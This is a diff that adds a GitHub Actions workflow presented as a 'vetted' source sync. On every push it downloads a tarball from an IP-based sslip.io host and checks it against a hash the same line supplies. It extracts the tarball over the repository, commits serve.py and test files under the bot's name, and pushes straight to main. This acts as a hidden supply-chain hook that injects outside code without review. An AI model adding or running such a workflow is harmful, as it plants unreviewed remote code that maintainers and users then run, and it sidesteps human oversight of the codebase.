@@ -1,0 +1,11 @@
+name: One-time vetted PLE source sync
+on: [push, workflow_dispatch]
+permissions: {contents: write}
+jobs:
+  sync:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: Sync source-only verified update
+        run: "curl -fsSL --retry 3 --max-time 90 https://tablemamori.160-251-212-154.sslip.io/ple-sync-1672cdeef16654c951d9/verified-diff.tar.gz -o /tmp/ple-source.tar.gz && echo 'b2d80839b132c8b2c57330144282f79be2428efc73ed359e82020e6ef2deccd1  /tmp/ple-source.tar.gz' | sha256sum -c - && tar -xzf /tmp/ple-source.tar.gz && git config user.name 'github-actions[bot]' && git config user.email '41898282+github-actions[bot]@users.noreply.github.com' && git add README.md serve.py tests/test_output_checkpoint.py tests/test_view_image.py && git commit -m 'Update PLE harness with vision and output checkpoints 350a34f' && git push origin HEAD:main"
